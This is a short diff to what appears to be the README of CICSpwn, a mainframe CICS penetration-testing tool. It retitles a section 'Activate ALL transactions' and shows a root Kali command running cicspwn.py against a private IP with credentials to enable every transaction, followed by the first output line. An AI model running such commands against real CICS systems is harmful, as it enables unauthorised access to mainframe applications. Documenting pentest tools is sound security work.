@@ -153,7 +153,7 @@ TES5	00001	0000000064	CECI
 
 ```
 
-## List TSQueues
+## Activate ALL transactions
 ```
 root@kali:~/cics# python cicspwn.py 192.168.1.207 23 -a CICS -U AYOUB -P AYOU1 --enable-tran ALL
 [+] Connecting to target 192.168.1.207:23
